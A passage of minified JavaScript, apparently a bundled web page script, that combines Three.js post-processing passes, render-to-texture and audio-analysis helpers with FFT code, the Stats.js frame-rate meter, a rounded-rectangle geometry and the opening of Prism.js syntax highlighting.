f,e,b=this.passes.length;for(e=0;e<b;e++){f=this.passes[e];if(!f.enabled){continue}f.render(this.renderer,this.writeBuffer,this.readBuffer,g,a);if(f.needsSwap){if(a){var c=this.renderer.context;c.stencilFunc(c.NOTEQUAL,1,4294967295);this.copyPass.render(this.renderer,this.writeBuffer,this.readBuffer,g);c.stencilFunc(c.EQUAL,1,4294967295)}this.swapBuffers()}if(f instanceof THREE.MaskPass){a=true}else{if(f instanceof THREE.ClearMaskPass){a=false}}}},reset:function(a){if(a===undefined){a=this.renderTarget1.clone();a.width=window.innerWidth*this.retina;a.height=window.innerHeight*this.retina}this.renderTarget1=a;this.renderTarget2=a.clone();this.writeBuffer=this.renderTarget1;this.readBuffer=this.renderTarget2},setSize:function(b,a){this.renderTarget1.dispose();this.renderTarget2.dispose();var c=this.renderTarget1.clone();c.width=b*this.retina;c.height=a*this.retina;this.reset(c)}};THREE.EffectComposer.camera=new THREE.OrthographicCamera(-1,1,1,-1,0,1);THREE.EffectComposer.quad=new THREE.Mesh(new THREE.PlaneGeometry(2,2),null);THREE.EffectComposer.scene=new THREE.Scene();THREE.EffectComposer.scene.add(THREE.EffectComposer.quad);THREE.MaskPass=function(b,a){this.scene=b;this.camera=a;this.enabled=true;this.clear=true;this.needsSwap=false;this.inverse=false};THREE.MaskPass.prototype={render:function(f,g,e,h){var c=f.context;c.colorMask(false,false,false,false);c.depthMask(false);var b,a;if(this.inverse){b=0;a=1}else{b=1;a=0}c.enable(c.STENCIL_TEST);c.stencilOp(c.REPLACE,c.REPLACE,c.REPLACE);c.stencilFunc(c.ALWAYS,b,4294967295);c.clearStencil(a);f.render(this.scene,this.camera,e,this.clear);f.render(this.scene,this.camera,g,this.clear);c.colorMask(true,true,true,true);c.depthMask(true);c.stencilFunc(c.EQUAL,1,4294967295);c.stencilOp(c.KEEP,c.KEEP,c.KEEP)}};THREE.ClearMaskPass=function(){this.enabled=true};THREE.ClearMaskPass.prototype={render:function(c,e,b,f){var a=c.context;a.disable(a.STENCIL_TEST)}};THREE.RenderPass=function(f,c,a,e,b){this.scene=f;this.camera=c;this.overrideMaterial=a;this.clearColor=e;this.clearAlpha=(b!==undefined)?b:1;this.oldClearColor=new THREE.Color();this.oldClearAlpha=1;this.enabled=true;this.clear=true;this.needsSwap=false};THREE.RenderPass.prototype={render:function(b,c,a,e){this.scene.overrideMaterial=this.overrideMaterial;if(this.clearColor){this.oldClearColor.copy(b.getClearColor());this.oldClearAlpha=b.getClearAlpha();b.setClearColor(this.clearColor,this.clearAlpha)}b.render(this.scene,this.camera,a,this.clear);if(this.clearColor){b.setClearColor(this.oldClearColor,this.oldClearAlpha)}this.scene.overrideMaterial=null}};THREE.ShaderPass=function(a,b){this.textureID=(b!==undefined)?b:"tDiffuse";this.uniforms=THREE.UniformsUtils.clone(a.uniforms);this.material=new THREE.ShaderMaterial({uniforms:this.uniforms,vertexShader:a.vertexShader,fragmentShader:a.fragmentShader});this.renderToScreen=false;this.enabled=true;this.needsSwap=true;this.clear=false};THREE.ShaderPass.prototype={render:function(b,c,a,e){if(this.uniforms[this.textureID]){this.uniforms[this.textureID].value=a}THREE.EffectComposer.quad.material=this.material;if(this.renderToScreen){b.render(THREE.EffectComposer.scene,THREE.EffectComposer.camera)}else{b.render(THREE.EffectComposer.scene,THREE.EffectComposer.camera,c,this.clear)}}};THREE.TexturePass=function(c,a){if(THREE.CopyShader===undefined){console.error("THREE.TexturePass relies on THREE.CopyShader")}var b=THREE.CopyShader;this.uniforms=THREE.UniformsUtils.clone(b.uniforms);this.uniforms.opacity.value=(a!==undefined)?a:1;this.uniforms.tDiffuse.value=c;this.material=new THREE.ShaderMaterial({uniforms:this.uniforms,vertexShader:b.vertexShader,fragmentShader:b.fragmentShader});this.enabled=true;this.needsSwap=false};THREE.TexturePass.prototype={render:function(b,c,a,e){THREE.EffectComposer.quad.material=this.material;b.render(THREE.EffectComposer.scene,THREE.EffectComposer.camera,a)}};var MicroEvent=function(){};MicroEvent.prototype={bind:function(b,a){this._events=this._events||{};this._events[b]=this._events[b]||[];this._events[b].push(a)},unbind:function(b,a){this._events=this._events||{};if(b in this._events===false){return}this._events[b].splice(this._events[b].indexOf(a),1)},trigger:function(b){this._events=this._events||{};if(b in this._events===false){return}for(var a=0;a<this._events[b].length;a++){this._events[b][a].apply(this,Array.prototype.slice.call(arguments,1))}}};MicroEvent.mixin=function(a){var c=["bind","unbind","trigger"];for(var b=0;b<c.length;b++){a.prototype[c[b]]=MicroEvent.prototype[c[b]]}};if(typeof module!=="undefined"&&("exports" in module)){module.exports=MicroEvent}(function(b){for(var a in b){if(!window[a]){throw"Error: ThreeRTT requires "+b[a]}}})({THREE:"Three.js"});window.ThreeRTT=window.ThreeRTT||{};ThreeRTT.World=function(){};ThreeRTT.getShader=function(b){var a=document.getElementById(b);return a&&a.innerText||b};_.loop=function(c,b){for(var a=0;a<c;++a){b(a)}};ThreeRTT.getShader=function(b){var a=document.getElementById(b);return a&&(a.innerText||a.textContent)||b};ThreeRTT.isPowerOfTwo=function(a){return(a&(a-1))===0};ThreeRTT.toTarget=function(a){if(ThreeRTT.Stage&&(a instanceof ThreeRTT.Stage)){return a.target}if(ThreeRTT.World&&(a instanceof ThreeRTT.World)){return a.target()}return a};ThreeRTT.toTexture=function(a,b){a=ThreeRTT.toTarget(a);if(ThreeRTT.RenderTarget&&(a instanceof ThreeRTT.RenderTarget)){return a.read()}return a};MicroEvent.prototype.on=function(){MicroEvent.prototype.bind.apply(this,arguments);return this};MicroEvent.prototype.emit=function(){MicroEvent.prototype.trigger.apply(this,arguments);return this};MicroEvent.mixin=function(a){var c=["bind","unbind","trigger","on","emit"];for(var b=0;b<c.length;b++){a.prototype[c[b]]=MicroEvent.prototype[c[b]]}};ThreeRTT.Stage=function(b,a){a=_.extend({history:0,camera:{},scene:null,},a);a.camera.aspect=a.camera.aspect||(a.width/a.height);this.scene=a.scene||new THREE.Scene();this.camera=ThreeRTT.Camera(a.camera);this.scene.add(this.camera);this.target=new ThreeRTT.RenderTarget(b,a);this.reset();this.size(a.width,a.height)};ThreeRTT.Stage.prototype={options:function(){return this.target.options},reset:function(){if(this.renderables){_.each(this.renderables,function(a){this.scene.remove(a)}.bind(this))}this.passes=[];this.renderables=[]},paint:function(c,f){var b=new THREE.Object3D();b.frustumCulled=false;b.visible=true;if(!f){var e=new ThreeRTT.FragmentMaterial(this,"generic-fragment-texture");var a=this._surface(e);b.add(a)}b.add(c);this.scene.add(b);this.passes.push(1);this.renderables.push(b)},iterate:function(c,b){var a=this._surface(b);a.visible=false;this.scene.add(a);this.passes.push(c);this.renderables.push(a);return this},fragment:function(a){this.iterate(1,a);return this},size:function(b,a){b=Math.floor(b);a=Math.floor(a);this.camera.aspect=b/a;this.target.size(b,a);return this},read:function(a){return this.target.read(a)},uniform:function(){return this.target.uniform()},render:function(){this.target.clear();function a(b,c){b.visible=c;_.each(b.children,function(e){a(e,c)})}_.each(this.passes,function(c,b){a(this.renderables[b],true);_.loop(c,function(e){this.target.render(this.scene,this.camera)}.bind(this));a(this.renderables[b],false)}.bind(this));return this},clear:function(){this.target.clear();return this},destroy:function(){this.target.deallocate();this.scene=null;this.camera=null;this.target=null},_surface:function(b){var a=new THREE.Mesh(new ThreeRTT.ScreenGeometry(),{});a.frustumCulled=false;a.material=b;a.renderDepth=Infinity;return a},};ThreeRTT.Camera=function(c){if(c.constructor instanceof THREE.Camera){return c}c=_.extend({aspect:1,far:10000,fov:85,near:0.01,ortho:false,scale:1},c);if(c.ortho){var e=c.scale,b=c.aspect;return new THREE.OrthographicCamera(-e*b,e*b,-e,e,c.near,c.far)}else{return new THREE.PerspectiveCamera(c.fov,c.aspect,c.near,c.far)}};ThreeRTT.RenderTarget=function(b,a){this.options=a=_.extend({width:256,height:256,texture:{},clear:{color:false,depth:false,stencil:false},clearColor:16777215,clearAlpha:1,history:0,scene:null,camera:null,autoAdvance:true},a);this.renderer=b;if(!ThreeRTT.isPowerOfTwo(a.width)||!ThreeRTT.isPowerOfTwo(a.height)){if(!a.texture.minFilter){a.texture.minFilter=THREE.LinearFilter}}this.history(this.options.history,true);this.size(a.width,a.height);this.clear()},ThreeRTT.RenderTarget.prototype={read:function(a){a=Math.max(0,Math.min(this.options.history,Math.abs(a||0)));return this.virtuals[a]},write:function(){return this.targets[this.index]},history:function(a,b){if(a!==undefined){this._history=a;this.buffers=a+2;b||this.allocate()}return this._history},size:function(b,a){if(b&&a){this.width=b=Math.floor(b);this.height=a=Math.floor(a);this.allocate()}return{width:this.width,height:this.height}},deallocate:function(){this.deallocateTargets()},allocate:function(){this.deallocateTargets();this.allocateTargets();this.allocateVirtuals()},deallocateTargets:function(){_.each(this.targets||[],function(a){a.dispose()}.bind(this))},allocateTargets:function(){var b=this.options;n=this.buffers;var a=this.targets=[];_.loop(n,function(c){a.push(new THREE.WebGLRenderTarget(this.width,this.height,b.texture));a[c].__index=c}.bind(this))},allocateVirtuals:function(){var a=this.targets[0],b=this.virtuals||[];n=Math.max(1,this.buffers-1);if(n>b.length){_.loop(n-b.length,function(){b.push(a.clone())}.bind(this))}else{b=b.slice(0,n)}_.each(b,function(e,c){e.width=this.width;e.height=this.height;e.__index=c}.bind(this));this.virtuals=b;this.index=-1;this.advance()},advance:function(){var e=this.options,a=this.targets,g=this.virtuals,c=this.index,f=this.buffers,b=g.length;this.index=c=(c+1)%f;_.loop(b,function(h){var k=g[h],j=a[(b-h+c)%f];k.__webglTexture=j.__webglTexture;k.__webglFramebuffer=j.__webglFramebuffer;k.__webglRenderbuffer=j.__webglRenderbuffer;k.__index=j.__index})},clear:function(){var c=this.options,a=c.clear,e=this.renderer;if(a.color||a.stencil||a.depth){var b=e.getClearColor().clone();var f=e.getClearAlpha();e.setClearColor(c.clearColor,c.clearAlpha);e.clearTarget(this.write(),a.color,a.stencil,a.depth);e.setClearColor(b,f)}},render:function(c,b){this.emit("render",c,b);var a=this.renderer.autoClear;this.renderer.autoClear=false;this.clear();this.renderer.render(c,b,this.write());this.renderer.autoClear=a;this.options.autoAdvance&&this.advance()},uniform:function(b){var c=this.history();if(c){var a=[];_.loop(c+1,function(e){a.push(this.read(-e))}.bind(this));return{type:"tv",value:a,count:c+1}}else{return{type:"t",value:b,texture:this.read(),count:1}}}};MicroEvent.mixin(ThreeRTT.RenderTarget);ThreeRTT.ScreenGeometry=function(){return new THREE.PlaneGeometry(2,2,1,1)};ThreeRTT.ShaderMaterial=function(e,g,c,h,j){function a(l){return"texture"+(l+1)}if(h instanceof Array){var b={};_.each(h,function(m,l){b[a(i)]=m});h=b}else{if(h instanceof THREE.Texture||h instanceof ThreeRTT.World||h instanceof THREE.WebGLRenderTarget){h={texture1:h}}}if(!(e instanceof Array)){e=[e]}e=_.map(e,function(l){return ThreeRTT.toTarget(l)});j=_.extend(j||{},{sampleStep:{type:"v2",value:new THREE.Vector2()}});_.each(h,function(m,l){j[l]={type:"t",value:ThreeRTT.toTexture(m)}});_.each(e,function(o,l){var m=a(l);if(o.read&&!j[m]){j[m]={type:"t",value:o.read()}}});if(j.texture1&&!j.texture){j.texture=j.texture1}var k;e[0].on("render",k=function(){var o=e[0].options.texture;var m=o.wrapS;var l=o.wrapT;var q={1000:0,1001:1,1002:0,};var p=j.sampleStep.value;p.x=1/(e[0].width-(q[m]||0));p.y=1/(e[0].height-(q[l]||0))});var f=new THREE.ShaderMaterial({uniforms:j,vertexShader:ThreeRTT.getShader(g||"generic-vertex"),fragmentShader:ThreeRTT.getShader(c||"generic-fragment-texture")});return f};ThreeRTT.Display=function(a,c,b){if(!(a instanceof Array)){a=[a]}this.gx=c||a.length;this.gy=b||1;this.targets=a;this.n=a.length;THREE.Object3D.call(this);this.make()};ThreeRTT.Display.prototype=_.extend(new THREE.Object3D(),{make:function(){var a=this.n,m=this.gx,l=this.gy,c=this.targets;var k=(m-1)/2,h=(l-1)/2;var g=new THREE.PlaneGeometry(1,1,1,1);var b=0;for(var f=0;b<a&&f<l;++f){for(var j=0;b<a&&j<m;++j,++b){var e=new THREE.MeshBasicMaterial({color:16777215,map:ThreeRTT.toTexture(c[b]),fog:false});e.side=THREE.DoubleSide;var o=new THREE.Mesh(g,e);o.renderDepth=10000+Math.random();this.add(o);if(m>1){o.position.x=-k+j}if(l>1){o.position.y=h-f}}}}});(function(){MicroEvent.mixin=function(j){var l=["bind","unbind","trigger"];for(var k=0;k<l.length;k++){j.prototype[l[k]]=MicroEvent.prototype[l[k]]}};if(typeof module!=="undefined"&&("exports" in module)){module.exports=MicroEvent}var a={LEFT:0,RIGHT:1,MIX:2,SINE:1,TRIANGLE:2,SAW:3,SQUARE:4,LOWPASS:0,HIGHPASS:1,BANDPASS:2,NOTCH:3,BARTLETT:1,BARTLETTHANN:2,BLACKMAN:3,COSINE:4,GAUSS:5,HAMMING:6,HANN:7,LANCZOS:8,RECTANGULAR:9,TRIANGULAR:10,OFF:0,FW:1,BW:2,FWBW:3,TWO_PI:2*Math.PI};function g(k,j){this.bufferSize=k;this.sampleRate=j;this.bandwidth=2/k*j/2;this.spectrum=new Float32Array(k/2);this.real=new Float32Array(k);this.imag=new Float32Array(k);this.peakBand=0;this.peak=0;this.getBandFrequency=function(l){return this.bandwidth*l+this.bandwidth/2};this.calculateSpectrum=function(){var r=this.spectrum,s=this.real,l=this.imag,u=2/this.bufferSize,w=Math.sqrt,o,t,p;for(var m=0,q=k/2;m<q;m++){o=s[m];t=l[m];p=u*w(o*o+t*t);if(p>this.peak){this.peakBand=m;this.peak=p}r[m]=p}}}function e(o,j){g.call(this,o,j);var m=o/2*o;var l=2*Math.PI;this.sinTable=new Float32Array(m);this.cosTable=new Float32Array(m);for(var k=0;k<m;k++){this.sinTable[k]=Math.sin(k*l/o);this.cosTable[k]=Math.cos(k*l/o)}}e.prototype.forward=function(j){var r=this.real,q=this.imag,o,m;for(var l=0;l<this.bufferSize/2;l++){o=0;m=0;for(var p=0;p<j.length;p++){o+=this.cosTable[l*p]*j[p];m+=this.sinTable[l*p]*j[p]}r[l]=o;q[l]=m}return this.calculateSpectrum()};function f(o,k){g.call(this,o,k);this.reverseTable=new Uint32Array(o);var j=1;var m=o>>1;var l;while(j<o){for(l=0;l<j;l++){this.reverseTable[l+j]=this.reverseTable[l]+m}j=j<<1;m=m>>1}this.sinTable=new Float32Array(o);this.cosTable=new Float32Array(o);for(l=0;l<o;l++){this.sinTable[l]=Math.sin(-Math.PI/l);this.cosTable[l]=Math.cos(-Math.PI/l)}}f.prototype.forward=function(y){var q=this.bufferSize,j=this.cosTable,o=this.sinTable,t=this.reverseTable,w=this.real,B=this.imag,D=this.spectrum;var z=Math.floor(Math.log(q)/Math.LN2);if(Math.pow(2,z)!==q){throw"Invalid buffer size, must be a power of 2."}if(q!==y.length){throw"Supplied buffer is not the same size as defined FFT. FFT Size: "+q+" Buffer Size: "+y.length}var x=1,s,u,l,p,E,m,r,C,A;for(A=0;A<q;A++){w[A]=y[t[A]];B[A]=0}while(x<q){s=j[x];u=o[x];l=1;p=0;for(var F=0;F<x;F++){A=F;while(A<q){E=A+x;m=(l*w[E])-(p*B[E]);r=(l*B[E])+(p*w[E]);w[E]=w[A]-m;B[E]=B[A]-r;w[A]+=m;B[A]+=r;A+=x<<1}C=l;l=(C*s)-(p*u);p=(C*u)+(p*s)}x=x<<1}return this.calculateSpectrum()};f.prototype.inverse=function(x,B){var q=this.bufferSize,j=this.cosTable,o=this.sinTable,u=this.reverseTable,D=this.spectrum;x=x||this.real;B=B||this.imag;var y=1,t,w,k,p,E,l,r,C,A;for(A=0;A<q;A++){B[A]*=-1}var m=new Float32Array(q);var s=new Float32Array(q);for(A=0;A<x.length;A++){m[A]=x[u[A]];s[A]=B[u[A]]}x=m;B=s;while(y<q){t=j[y];w=o[y];k=1;p=0;for(var F=0;F<y;F++){A=F;while(A<q){E=A+y;l=(k*x[E])-(p*B[E]);r=(k*B[E])+(p*x[E]);x[E]=x[A]-l;B[E]=B[A]-r;x[A]+=l;B[A]+=r;A+=y<<1}C=k;k=(C*t)-(p*w);p=(C*w)+(p*t)}y=y<<1}var z=new Float32Array(q);for(A=0;A<q;A++){z[A]=x[A]/q}return z};function b(k,j){g.call(this,k,j);this.trans=new Float32Array(k);this.reverseTable=new Uint32Array(k);this.reverseBinPermute=function(m,t){var u=this.bufferSize,p=u>>>1,l=u-1,o=1,s=0,q;m[0]=t[0];do{s+=p;m[o]=t[s];m[s]=t[o];o++;q=p<<1;while(q=q>>1,!((s^=q)&q)){}if(s>=o){m[o]=t[s];m[s]=t[o];m[l-o]=t[l-s];m[l-s]=t[l-o]}o++}while(o<p);m[l]=t[l]};this.generateReverseTable=function(){var s=this.bufferSize,o=s>>>1,l=s-1,m=1,q=0,p;this.reverseTable[0]=0;do{q+=o;this.reverseTable[m]=q;this.reverseTable[q]=m;m++;p=o<<1;while(p=p>>1,!((q^=p)&p)){}if(q>=m){this.reverseTable[m]=q;this.reverseTable[q]=m;this.reverseTable[l-m]=l-q;this.reverseTable[l-q]=l-m}m++}while(m<o);this.reverseTable[l]=l};this.generateReverseTable()}b.prototype.forward=function(A){var T=this.bufferSize,z=this.spectrum,S=this.trans,k=2*Math.PI,Q=Math.sqrt,V=T>>>1,B=2/T,F,E,D,X,K,J,H,G,t,s,r,q,p,o,m,l,w,R,L,P,I,W,Y,y,N,M;this.reverseBinPermute(S,A);for(var C=0,O=4;C<T;O*=4){for(var u=C;u<T;u+=O){w=S[u]-S[u+1];S[u]+=S[u+1];S[u+1]=w}C=2*(O-1)}F=2;X=T>>>1;while((X=X>>>1)){C=0;F=F<<1;O=F<<1;E=F>>>2;D=F>>>3;do{if(E!==1){for(u=C;u<T;u+=O){t=u;s=t+E;r=s+E;q=r+E;K=S[r]+S[q];S[q]-=S[r];S[r]=S[t]-K;S[t]+=K;t+=D;s+=D;r+=D;q+=D;K=S[r]+S[q];J=S[r]-S[q];K=-K*Math.SQRT1_2;J*=Math.SQRT1_2;w=S[s];S[q]=K+w;S[r]=K-w;S[s]=S[t]-J;S[t]+=J}}else{for(u=C;u<T;u+=O){t=u;s=t+E;r=s+E;q=r+E;K=S[r]+S[q];S[q]-=S[r];S[r]=S[t]-K;S[t]+=K}}C=(O<<1)-F;O=O<<2}while(C<T);W=k/F;for(var U=1;U<D;U++){Y=U*W;L=Math.sin(Y);R=Math.cos(Y);P=4*R*(R*R-0.75);I=4*L*(0.75-L*L);C=0;O=F<<1;do{for(u=C;u<T;u+=O){t=u+U;s=t+E;r=s+E;q=r+E;p=u+E-U;o=p+E;m=o+E;l=m+E;J=S[m]*R-S[r]*L;K=S[m]*L+S[r]*R;G=S[l]*P-S[q]*I;H=S[l]*I+S[q]*P;w=J-G;J+=G;G=w;S[l]=J+S[o];S[r]=J-S[o];w=H-K;K+=H;H=w;S[q]=H+S[s];S[m]=H-S[s];S[o]=S[t]-K;S[t]+=K;S[s]=G+S[p];S[p]-=G}C=(O<<1)-F;O=O<<2}while(C<T)}}while(--V){y=S[V];N=S[T-V-1];M=B*Q(y*y+N*N);if(M>this.peak){this.peakBand=V;this.peak=M}z[V]=M}z[0]=B*S[0];return z};(function(k){for(var j in k){if(!window[j]){throw"Error: ThreeAudio requires "+k[j]}}})({THREE:"Three.js",MicroEvent:"MicroEvent.js"});window.ThreeAudio=window.ThreeAudio||{};ThreeAudio.getShader=function(k){var j=document.getElementById(k);return j&&(j.innerText||j.textContent)||k};window._=window._||{};_.each=_.each||function(j,k){if(j.forEach){return j.forEach(k)}for(key in j){k(j[key],key,j)}};_.extend=_.extend||function(j){_.each([].slice.call(arguments,1),function(l){for(var k in l){j[k]=l[k]}});return j};MicroEvent.prototype.on=function(){MicroEvent.prototype.bind.apply(this,arguments);return this};MicroEvent.prototype.emit=function(){MicroEvent.prototype.trigger.apply(this,arguments);return this};MicroEvent.mixin=function(j){var l=["bind","unbind","trigger","on","emit"];for(var k=0;k<l.length;k++){j.prototype[l[k]]=MicroEvent.prototype[l[k]]}};ThreeAudio.toTexture=function(j){return(ThreeRTT&&ThreeRTT.toTexture&&ThreeRTT.toTexture(j))||j};var h=Math.PI,c=h*2;ThreeAudio.Source=function(k,j){this.fftSize=k||1024;this.lowpass=22050;this.filters={};this.playing=false;if(!(window.webkitAudioContext||window.mozAudioContext||window.AudioContext)){throw"Web Audio API not supported"}else{this.initElement(j)}};ThreeAudio.Source.prototype={initElement:function(j){var k=this.context=new (window.webkitAudioContext||window.mozAudioContext||window.AudioContext)();if(j){this.element=j}else{this.element=new Audio();this.element.preload="auto"}this.element.addEventListener("canplay",function(){this.initAnalyzer()}.bind(this))},initAnalyzer:function(){var x=this.context;this.source=x.createMediaElementSource(this.element);this.analyser=x.createAnalyser();var y=this.analyser.fftSize=this.fftSize;var z={bass:{type:0,frequency:160,Q:1.2,gain:2},mid:{type:2,frequency:500,Q:1.2,gain:4},treble:{type:1,frequency:2000,Q:1.2,gain:3}};var o=this.filters;_.each(z,function(j,k){var p=x.createBiquadFilter();p.key=k;p.type=j.type;p.frequency.value=j.frequency;p.Q.value=j.Q;p.analyser=x.createAnalyser();p.analyser.fftSize=y;p.delayNode=x.createDelay();p.delayNode.delayTime.value=0;p.gainNode=x.createGain();p.gainNode.gain.value=j.gain;o[k]=p});this.outputFilter=x.createBiquadFilter();this.outputFilter.type=0;this.outputFilter.frequency.value=this.lowpass;this.outputFilter.Q.value=1.2;var q=256;var u=x.createBuffer(2,q,x.sampleRate);for(var r=0;r<2;++r){var w=u.getChannelData(r);var A=0;var m=1;for(var t=0;t<256;t+=Math.floor(Math.random()*5+1)){w[t]=t?Math.random()*Math.exp(-t/q):1}}this.reverb=x.createConvolver();this.reverb.buffer=u;this.delay=x.createDelay();this.delay.delayTime.value=this.fftSize*2/x.sampleRate;this.source.connect(this.analyser);this.analyser.connect(this.delay);this.delay.connect(x.destination);var l=this.source;_.each(o,function(j){l.connect(j.delayNode);j.delayNode.connect(j);j.connect(j.gainNode);j.gainNode.connect(j.analyser)});this.samples=this.analyser.frequencyBinCount;this.data={freq:new Uint8Array(this.samples),time:new Uint8Array(this.samples),filter:{bass:new Uint8Array(this.samples),mid:new Uint8Array(this.samples),treble:new Uint8Array(this.samples)}}},update:function(){var j=this.analyser,k=this.data;if(j){j.smoothingTimeConstant=0;j.getByteFrequencyData(k.freq);j.getByteTimeDomainData(k.time);_.each(this.filters,function(l){l.analyser.getByteTimeDomainData(k.filter[l.key])})}return this},size:function(){return this.analyser.frequencyBinCount},load:function(j,p){var k=this.context,m=this.source,l=this;var o=function(){if(l.playing){l._play()}l.element.removeEventListener("canplaythrough",o);p&&p()};this.element.addEventListener("canplaythrough",o);this.element.src=j;return this},play:function(){this.playing=true;if(this.element.readyState==4){this._play()}return this},stop:function(){this.playing=false;if(this.element.readyState==4){this._stop()}return this},_play:function(){this.element.play()},_stop:function(){this.element.pause()}}})();var Stats=function(){var C=Date.now(),B=C,H=0,A=Infinity,z=0,G=0,y=Infinity,x=0,w=0,u=0,I=document.createElement("div");I.id="stats";I.addEventListener("mousedown",function(a){a.preventDefault();b(++u%2)},!1);I.style.cssText="width:80px;opacity:0.9;cursor:pointer";var M=document.createElement("div");M.id="fps";M.style.cssText="padding:0 0 3px 3px;text-align:left;background-color:#002";I.appendChild(M);var F=document.createElement("div");F.id="fpsText";F.style.cssText="color:#0ff;font-family:Helvetica,Arial,sans-serif;font-size:9px;font-weight:bold;line-height:15px";F.innerHTML="FPS";M.appendChild(F);var L=document.createElement("div");L.id="fpsGraph";L.style.cssText="position:relative;width:74px;height:30px;background-color:#0ff";for(M.appendChild(L);74>L.children.length;){var E=document.createElement("span");E.style.cssText="width:1px;height:30px;float:left;background-color:#113";L.appendChild(E)}var K=document.createElement("div");K.id="ms";K.style.cssText="padding:0 0 3px 3px;text-align:left;background-color:#020;display:none";I.appendChild(K);var D=document.createElement("div");D.id="msText";D.style.cssText="color:#0f0;font-family:Helvetica,Arial,sans-serif;font-size:9px;font-weight:bold;line-height:15px";D.innerHTML="MS";K.appendChild(D);var J=document.createElement("div");J.id="msGraph";J.style.cssText="position:relative;width:74px;height:30px;background-color:#0f0";for(K.appendChild(J);74>J.children.length;){E=document.createElement("span"),E.style.cssText="width:1px;height:30px;float:left;background-color:#131",J.appendChild(E)}var b=function(a){u=a;switch(u){case 0:M.style.display="block";K.style.display="none";break;case 1:M.style.display="none",K.style.display="block"}};return{REVISION:11,domElement:I,setMode:b,begin:function(){C=Date.now()},end:function(){var c=Date.now();H=c-C;A=Math.min(A,H);z=Math.max(z,H);D.textContent=H+" MS ("+A+"-"+z+")";var e=Math.min(30,30-30*(H/200));J.appendChild(J.firstChild).style.height=e+"px";w++;c>B+1000&&(G=Math.round(1000*w/(c-B)),y=Math.min(y,G),x=Math.max(x,G),F.textContent=G+" FPS ("+y+"-"+x+")",e=Math.min(30,30-30*(G/100)),L.appendChild(L.firstChild).style.height=e+"px",B=c,w=0);return c},update:function(){C=this.end()}}};THREE.RoundRectGeometry=function(A,w,f,B,l){THREE.Geometry.call(this);this.width=A=A||1;this.height=w=w||1;this.radius=f=f||0.25;this.segments=B=Math.max(1,B||5);var e=A/2;var b=w/2;var I=new THREE.Vector3(0,0,1);var u=[1,1,-1,1,-1,-1,1,-1,];for(var D=0;D<4;++D){this.vertices.push(new THREE.Vector3((e-f)*u[D*2],(b-f)*u[D*2+1]))}var k=Math.PI/2/B;for(var D=0;D<4;++D){var G=this.vertices[D];var r=G.x;var p=G.y;var F=D*Math.PI/2;for(var C=0;C<=B;++C){this.vertices.push(new THREE.Vector3(Math.cos(F)*f+r,Math.sin(F)*f+p));F+=k}}var h=this.vertices;var a=this.faces;var E=this.faceVertexUvs;var c=1/A;var t=1/w;var g=l?-1:1;function q(o,j,y){var x=new THREE.Face3(o,j,y);x.normal.copy(I);x.vertexNormals.push(I.clone(),I.clone(),I.clone());o=h[o];j=h[j];y=h[y];a.push(x);E[0].push([new THREE.Vector2(o.x*c+0.5,l*o.y*t+0.5),new THREE.Vector2(j.x*c+0.5,l*j.y*t+0.5),new THREE.Vector2(y.x*c+0.5,l*y.y*t+0.5),])}function m(o,j,J,y){var x=new THREE.Face4(o,j,J,y);x.normal.copy(I);x.vertexNormals.push(I.clone(),I.clone(),I.clone(),I.clone());o=h[o];j=h[j];J=h[J];y=h[y];a.push(x);E[0].push([new THREE.Vector2(o.x*c+0.5,o.y*t+0.5),new THREE.Vector2(j.x*c+0.5,j.y*t+0.5),new THREE.Vector2(J.x*c+0.5,J.y*t+0.5),new THREE.Vector2(y.x*c+0.5,y.y*t+0.5),])}m(0,1,2,3);var s=B+1;var H=s*4;for(var D=0;D<4;++D){var z=(D+1)*s;m((D+1)%4,D,4+((z-1)%H),4+(z%H))}for(var D=0;D<4;++D){for(var C=0;C<B;++C){q(D,4+D*s+C,4+D*s+C+1)}}this.computeCentroids()};THREE.RoundRectGeometry.prototype=Object.create(THREE.Geometry.prototype);var _self="undefined"!=typeof window?window:"undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?self:{},Prism=function(f){var m=/\blang(?:uage)?-([\w-]+)\b/i,b=0,j={manual:f.Prism&&f.Prism.manual,disableWorkerMessageHandler:f.Prism&&f.Prism.disableWorkerMessageHandler,util:{encode:function(a){return a instanceof k?new k(a.type,j.util.encode(a.content),a.alias):Array.isArray(a)?a.map(j.util.encode):a.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/\u00a0/g," ")},type:function(a){return Object.prototype.toString.call(a).slice(8,-1)},objId:function(a){return a.__id||Object.defineProperty(a,"__id",{value:++b}),a.__id},clone:function l(s,p){var q,c,g=j.util.type(s);switch(p=p||{},g){case"Object":if(c=j.util.objId(s),p[c]){return p[c]}for(var u in q={},p[c]=q,s){s.hasOwnProperty(u)&&(q[u]=l(s[u],p))}return q;case"Array":return c=j.util.objId(s),p[c]?p[c]:(q=[],p[c]=q,s.forEach(function(r,o){q[o]=l(r,p)}),q);default:return s}}},languages:{extend:function(o,c){var p=j.util.clone(j.languages[o]);for(var g in c){p[g]=c[g]}return p},insertBefore:function(p,w,x,y){var c=(y=y||j.languages)[p],u={};for(var g in c){if(c.hasOwnProperty(g)){if(g==w){for(var q in x){x.hasOwnProperty(q)&&(u[q]=x[q])}}x.hasOwnProperty(g)||(u[g]=c[g])}}var z=y[p];return y[p]=u,j.languages.DFS(j.languages,function(r,o){o===z&&r!=p&&(this[r]=u)}),u},DFS:function h(e,x,p,u){u=u||{};var g=j.util.objId;for(var w in e){if(e.hasOwnProperty(w)){x.call(e,w,e[w],p||w);var c=e[w],q=j.util.type(c);"Object"!==q||u[g(c)]?"Array"!==q||u[g(c)]||(u[g(c)]=!0,h(c,x,w,u)):(u[g(c)]=!0,h(c,x,null,u))}}}},plugins:{},highlightAll:function(g,c){j.highlightAllUnder(document,g,c)},highlightAllUnder:function(s,c,w){var p={callback:w,selector:'code[class*="language-"], [class*="language-"] code, code[class*="lang-"], [class*="lang-"] code'};j.hooks.run("before-highlightall",p);for(var q,g=s.querySelectorAll(p.selector),u=0;q=g[u++];){j.highlightElement(q,!0===c,p.callback)}},highlightElement:function(w,x,p){for(var y,c="none",u=w;u&&!m.test(u.className);){u=u.parentNode}u&&(c=(u.className.match(m)||[,"none"])[1].toLowerCase(),y=j.languages[c]),w.className=w.className.replace(m,"").replace(/\s+/g," ")+" language-"+c,w.parentNode&&(u=w.parentNode,/pre/i.test(u.nodeName)&&(u.className=u.className.replace(m,"").replace(/\s+/g," ")+" language-"+c));var 